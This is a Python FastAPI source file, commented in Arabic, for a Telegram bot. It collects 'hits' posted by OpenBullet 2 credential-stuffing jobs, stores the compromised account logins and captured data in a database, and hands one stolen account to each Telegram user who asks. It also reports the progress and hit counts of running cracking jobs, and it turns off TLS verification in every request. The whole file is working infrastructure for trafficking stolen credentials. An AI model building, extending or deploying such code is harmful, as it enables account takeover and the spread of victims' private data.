from fastapi import FastAPI, Request
import httpx
import os
from sqlalchemy import create_engine, Column, Integer, String, Boolean, func
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker

app = FastAPI()

# ==================== CONFIGURATION ====================
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
ADMIN_IDS = ["123456789"]  # ⚠️ ضع الـ Chat ID الخاص بك هنا لتفعيل لوحة التحكم

# إعدادات ربط OpenBullet 2 (Hugging Face Private Space)
OPENBULLET_URL = os.getenv("OPENBULLET_URL")        
OPENBULLET_API_KEY = os.getenv("OPENBULLET_API_KEY")  
HF_TOKEN = os.getenv("HF_TOKEN")                    

# إعدادات قاعدة بيانات ريندر (PostgreSQL)
DATABASE_URL = os.getenv("DATABASE_URL")
if DATABASE_URL and DATABASE_URL.startswith("postgres://"):
    DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)

# ==================== DATABASE CONFIG ====================
engine = create_engine(DATABASE_URL)
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
Base = declarative_base()

class Account(Base):
    __tablename__ = "accounts"
    id = Column(Integer, primary_key=True, index=True)
    config_name = Column(String, index=True)
    account_data = Column(String, unique=True, index=True)
    captured_data = Column(String)
    is_given = Column(Boolean, default=False)

class DeliveredAccount(Base):
    __tablename__ = "delivered_accounts"
    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(String, unique=True, index=True)

Base.metadata.create_all(bind=engine)

# ==================== CYBER KEYBOARDS (عربي) ====================

# 1. القائمة الرئيسية الثابتة أسفل الشاشة
def get_main_keyboard(is_admin: bool):
    buttons = [
        [{"text": "⚡ 🧬 سحب حساب جديد 🧬 ⚡"}, {"text": "📡 🌐 إحصائيات المخزن 🌐 📡"}],
        [{"text": "🤖 ⚔️ عمليات أوبن بلوت الجارية ⚔️ 🤖"}]
    ]
    if is_admin:
        buttons.append([{"text": "🛠️ 👾 لوحة تحكم المطور 👾 🛠️"}])
        
    return {
        "keyboard": buttons,
        "resize_keyboard": True,
        "one_time_keyboard": False
    }

# 2. الأزرار التفاعلية أسفل لوحة تحكم الأدمن
def get_inline_control_buttons():
    return {
        "inline_keyboard": [
            [
                {"text": "🧹 تصفير الموزع", "callback_data": "reset_delivered"},
                {"text": "🚨 تصفير المخزن بالكامل", "callback_data": "clear_accounts"}
            ],
            [
                {"text": "🔄 تحديث بيانات اللوحة", "callback_data": "refresh_admin_stats"}
            ]
        ]
    }

# ==================== ENDPOINTS ====================

@app.get("/")
def read_root():
    return {"status": "Cyber Core Matrix is operational and secure."}

# استقبال الـ Hits وتخزينها تلقائياً
@app.post("/webhook/hit")
async def receive_hit(request: Request):
    db = SessionLocal()
    try:
        data = await request.json()
        config_name = data.get("config") or data.get("configName") or data.get("ConfigName") or "UNKNOWN_MODULE"
        account_data = data.get("data", "NO_DATA")
        captured_data = data.get("captured") or data.get("capturedData") or data.get("variables") or "NO_CAPTURED_DATA"
        
        exists = db.query(Account).filter(Account.account_data == account_data).first()
        if exists:
            return {"status": "ignored"}
            
        new_account = Account(config_name=config_name, account_data=account_data, captured_data=captured_data, is_given=False)
        db.add(new_account)
        db.commit()
        return {"status": "success"}
    except Exception as e:
        db.rollback()
        return {"status": "error", "message": str(e)}
    finally:
        db.close()

# معالجة البوت والويب هوك الخاص بتليجرام
@app.post("/webhook/telegram")
async def telegram_webhook(request: Request):
    db = SessionLocal()
    try:
        payload = await request.json()
        telegram_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"
        
        # --- [أ] Callback Queries (الأزرار الشفافة التفاعلية) ---
        if "callback_query" in payload:
            callback_id = payload["callback_query"]["id"]
            chat_id = str(payload["callback_query"]["message"]["chat"]["id"])
            message_id = payload["callback_query"]["message"]["message_id"]
            data = payload["callback_query"]["data"]
            
            # 1. معالجة اختيار الزائر لنوع الحساب المطلوب
            if data.startswith("claim_cfg:"):
                selected_config = data.split("claim_cfg:")[1]
                
                already_received = db.query(DeliveredAccount).filter(DeliveredAccount.user_id == chat_id).first()
                if already_received:
                    async with httpx.AsyncClient(verify=False) as client:
                        await client.post(f"{telegram_url}/answerCallbackQuery", json={"callback_query_id": callback_id, "text": "❌ حظر: لقد قمت بسحب حصتك سابقاً!", "show_alert": True})
                    return {"status": "success"}
                
                account = db.query(Account).filter(Account.config_name == selected_config, Account.is_given == False).first()
                
                async with httpx.AsyncClient(verify=False) as client:
                    if not account:
                        await client.post(f"{telegram_url}/answerCallbackQuery", json={"callback_query_id": callback_id, "text": "😔 عذراً، نفدت الحسابات من هذا النوع حالياً!", "show_alert": True})
                    else:
                        account.is_given = True
                        db.add(DeliveredAccount(user_id=chat_id))
                        db.commit()
                        
                        reply_text = (
                            f"🌌 **⚡ 「 تم اختراق المصفوفة وسحب الحساب بنجاح 」 ⚡** 🌌\n\n"
                            f"📦 **النوع المختار:** `{account.config_name}`\n\n"
                            f"👤 **بيانات الحساب:**\n`{account.account_data}`\n\n"
                            f"⚙️ **البيانات المستخرجة:**\n`{account.captured_data}`\n\n"
                            f"🔒 _STATUS: TERMINAL LOCKED_"
                        )
                        await client.post(f"{telegram_url}/editMessageText", json={"chat_id": chat_id, "message_id": message_id, "text": reply_text, "parse_mode": "Markdown"})
                return {"status": "success"}

            # 2. أوامر لوحة تحكم الأدمن
            if chat_id not in ADMIN_IDS:
                return {"status": "success"}
                
            async with httpx.AsyncClient(verify=False) as client:
                if data == "reset_delivered":
                    db.query(DeliveredAccount).delete()
                    db.commit()
                    await client.post(f"{telegram_url}/answerCallbackQuery", json={"callback_query_id": callback_id, "text": "🧹 تم تصفير سجل التوزيع! يمكن للجميع السحب مجدداً.", "show_alert": True})
                elif data == "clear_accounts":
                    db.query(Account).delete()
                    db.commit()
                    await client.post(f"{telegram_url}/answerCallbackQuery", json={"callback_query_id": callback_id, "text": "🚨 تم مسح جميع الحسابات من المخزن تماماً.", "show_alert": True})
                elif data == "refresh_admin_stats":
                    total_accounts = db.query(Account).count()
                    available_count = db.query(Account).filter(Account.is_given == False).count()
                    delivered_count = db.query(Account).filter(Account.is_given == True).count()
                    
                    updated_text = f"┌─── 🌌 **「 لوحة تحكم النيون المتقدمة 」** 🌌\n│\n├── 🟣 **إجمالي الحسابات:** `{total_accounts}`\n├── 🟢 **الحسابات الجاهزة:** `{available_count}`\n└── 🔴 **الحسابات الموزعة:** `{delivered_count}`\n│\n└────────────── [ تحديث مباشر للشبكة ] 🖥️"
                    await client.post(f"{telegram_url}/editMessageText", json={"chat_id": chat_id, "message_id": message_id, "text": updated_text, "reply_markup": get_inline_control_buttons(), "parse_mode": "Markdown"})
            return {"status": "success"}

        # --- [ب] معالجة الرسائل وضغطات الأزرار الثابتة ---
        if "message" not in payload or "text" not in payload["message"]:
            return {"status": "ignored"}
            
        chat_id = str(payload["message"]["chat"]["id"])
        user_text = payload["message"]["text"].strip()
        is_admin = chat_id in ADMIN_IDS
        
        if user_text == "/start":
            welcome_text = f"🌌 **WELCOME TO THE CYBERPUNK DISTRIBUTOR CORE** 🌌\n\n⚡ `الحالة: متصل بالشبكة الآمنة`\n🎛️ `الواجهة: ثيم التوزيع التفاعلي v4.0`\n\n🤖 _استخدم الأزرار المعرّبة بالأسفل للتحكم بالنظام، أو فحص واختيار حسابك المفضّل..._"
            await httpx.AsyncClient(verify=False).post(f"{telegram_url}/sendMessage", json={"chat_id": chat_id, "text": welcome_text, "reply_markup": get_main_keyboard(is_admin), "parse_mode": "Markdown"})
                
        elif user_text == "📡 🌐 إحصائيات المخزن 🌐 📡" or user_text == "/stats":
            available_count = db.query(Account).filter(Account.is_given == False).count()
            reply_text = f"┌─── 📡 **「 مستودع البيانات 」** 📡\n│\n└── 🟢 **المتوفر الإجمالي بالمخزن حالياً:** `{available_count}` حساب\n│\n└───────────── [ مصفوفة حية ] ⚡"
            await httpx.AsyncClient(verify=False).post(f"{telegram_url}/sendMessage", json={"chat_id": chat_id, "text": reply_text, "parse_mode": "Markdown"})
                
        # زر فحص نوع الحسابات وتوفير خيارات الاختيار للزائر
        elif user_text == "⚡ 🧬 سحب حساب جديد 🧬 ⚡" or user_text == "/get":
            already_received = db.query(DeliveredAccount).filter(DeliveredAccount.user_id == chat_id).first()
            
            if already_received:
                reply_text = "🚨 **SYSTEM DENIAL:** `جدار الحماية نشط` 🚨\n\n❌ عذراً! يسمح النظام بـ **حساب واحد فقط لكل مستخدم** لضمان التوزيع العادل للجميع."
                await httpx.AsyncClient(verify=False).post(f"{telegram_url}/sendMessage", json={"chat_id": chat_id, "text": reply_text, "parse_mode": "Markdown"})
            else:
                results = db.query(Account.config_name, func.count(Account.id)).filter(Account.is_given == False).group_by(Account.config_name).all()
                
                if not results:
                    reply_text = "🚨 **MAINFRAME ERROR:** `المستودع فارغ حالياً` 🚨\n\n😔 لا توجد حسابات جاهزة في قاعدة البيانات، انتظر حتى يكتمل الصيد والضخ التلقائي."
                    await httpx.AsyncClient(verify=False).post(f"{telegram_url}/sendMessage", json={"chat_id": chat_id, "text": reply_text, "parse_mode": "Markdown"})
                else:
                    inline_buttons = []
                    for config_name, count in results:
                        inline_buttons.append([{"text": f"🎁 {config_name} ({count})", "callback_data": f"claim_cfg:{config_name}"}])
                    
                    choice_text = (
                        f"┌─── 🎛️ **「 قائمة التخصيص والتعيين 」** 🎛️\n"
                        f"│\n"
                        f"├── ⚡ تم فحص قاعدة البيانات وتجميع الأنواع المتوفرة.\n"
                        f"└── 👇 **اختر نوع الحساب الذي ترغب بسحبه الآن:**"
                    )
                    await httpx.AsyncClient(verify=False).post(f"{telegram_url}/sendMessage", json={"chat_id": chat_id, "text": choice_text, "reply_markup": {"inline_keyboard": inline_buttons}, "parse_mode": "Markdown"})

        # زر مراقبة عمليات أوبن بلوت (مع تصحيح وتنظيف الرابط التلقائي لمنع الـ 404)
        elif user_text == "🤖 ⚔️ عمليات أوبن بلوت الجارية ⚔️ 🤖":
            if not OPENBULLET_URL or not OPENBULLET_API_KEY:
                reply_text = "❌ **خطأ:** متغيرات البيئة الخاصة بـ OpenBullet غير مكتملة الإعداد على ريندر."
            else:
                # خطوة معالجة سيبرانية لمنع الـ 404: تنظيف الرابط من الفراغات والرموز الخلفية المخفية
                base_url = OPENBULLET_URL.strip().rstrip("/")
                ob_api_url = f"{base_url}/api/v1/jobs"
                
                headers = {"Authorization": f"Bearer {OPENBULLET_API_KEY}"}
                if HF_TOKEN: 
                    headers["X-Hf-Token"] = HF_TOKEN.strip()

                try:
                    async with httpx.AsyncClient(verify=False, timeout=6.0) as client:
                        response = await client.get(ob_api_url, headers=headers)
                    
                    if response.status_code == 200:
                        jobs_data = response.json()
                        running_jobs = [j for j in jobs_data if j.get("status") in ["Running", "Active"]]
                        if not running_jobs:
                            reply_text = "💤 **حالة الـ Mainframe:** `خامل (IDLE)`\n\n🟢 لا توجد أي عمليات فحص جارية حالياً على خادم OpenBullet."
                        else:
                            reply_text = f"⚙️ **「 شاشة مراقبة OPENBULLET التلقائية 」** ⚙️\n\n⚡ **العمليات النشطة:** `{len(running_jobs)}` عملية فحص جارية\n────────────────────\n"
                            for job in running_jobs:
                                reply_text += f"📦 **العملية:** `{job.get('name')}`\n📊 **التقدم:** `{job.get('progress', 0):.1f}%`\n⚡ **السرعة الإجمالية (CPM):** `{job.get('cpm', 0)}`\n🎯 **الـ Hits المحصودة:** `{job.get('hits', 0)}`\n📡 `الحالة: جاري الفحص وسحب الحسابات...`\n────────────────────\n"
                    else:
                        reply_text = f"❌ **فشل التصريح (خطأ {response.status_code}):** رفض الخادم الاتصال بالـ API. يرجى مراجعة وتعديل مسار الـ API المعتمد داخل إعدادات تطبيق الـ Space الخاص بك."
                except Exception as ex:
                    reply_text = f"🚨 **خطأ بالاتصال بالـ Space:** لا يمكن إرسال الطلب عبر جدار الحماية.\n`تفاصيل: {str(ex)}`"
            await httpx.AsyncClient(verify=False).post(f"{telegram_url}/sendMessage", json={"chat_id": chat_id, "text": reply_text, "parse_mode": "Markdown"})

        elif user_text == "🛠️ 👾 لوحة تحكم المطور 👾 🛠️" and is_admin:
            total_accounts = db.query(Account).count()
            available_count = db.query(Account).filter(Account.is_given == False).count()
            delivered_count = db.query(Account).filter(Account.is_given == True).count()
            admin_text = f"┌─── 🌌 **「 لوحة تحكم النيون المتقدمة 」** 🌌\n│\n├── 🟣 **إجمالي الحسابات بالسيستم:** `{total_accounts}`\n├── 🟢 **الحسابات الجاهزة للتسليم:** `{available_count}`\n└── 🔴 **الحسابات التي تم توزيعها:** `{delivered_count}`\n│\n└────────────── [ أوامر النظام التفاعلية ] 👇"
            await httpx.AsyncClient(verify=False).post(f"{telegram_url}/sendMessage", json={"chat_id": chat_id, "text": admin_text, "reply_markup": get_inline_control_buttons(), "parse_mode": "Markdown"})

        return {"status": "success"}
    except Exception as e:
        db.rollback()
        return {"status": "error"}
    finally:
        db.close()
